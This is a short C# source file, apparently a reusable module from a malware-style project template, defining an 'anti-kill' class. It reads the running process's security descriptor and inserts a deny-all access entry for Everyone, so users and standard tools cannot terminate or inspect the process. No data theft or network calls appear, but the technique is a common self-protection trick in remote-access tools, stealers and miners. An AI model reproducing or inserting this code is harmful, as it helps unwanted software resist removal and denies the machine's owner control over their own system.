using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace ProjNAME 
{
    class c_AntiKill
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor,
        uint nLength, out uint lpnLengthNeeded);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
         RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
        {
            byte[] psd = new byte[0];
            uint bufSizeNeeded;
            GetKernelObjectSecurity(processHandle, 0x00000004, psd, 0, out bufSizeNeeded);
            if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
                throw new Win32Exception();
            if (!GetKernelObjectSecurity(processHandle, 0x00000004,
            psd = new byte[bufSizeNeeded], bufSizeNeeded, out bufSizeNeeded))
                throw new Win32Exception();
            return new RawSecurityDescriptor(psd, 0);
        }
        void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
        {
            byte[] rawsd = new byte[dacl.BinaryLength];
            dacl.GetBinaryForm(rawsd, 0);
            if (!SetKernelObjectSecurity(processHandle, 0x00000004, rawsd))
                throw new Win32Exception();
        }
        public void c_ImAntiKill()
        {
            IntPtr hProcess = GetCurrentProcess();
            var dacl = GetProcessSecurityDescriptor(hProcess);
            dacl.DiscretionaryAcl.InsertAce(0,new CommonAce(AceFlags.None, AceQualifier.AccessDenied, (int)(0x000f0000 | 0x00100000 | 0xFFF),new SecurityIdentifier(WellKnownSidType.WorldSid, null),false,null));
            SetProcessSecurityDescriptor(hProcess, dacl);
            Console.Read();
        }
    }
}
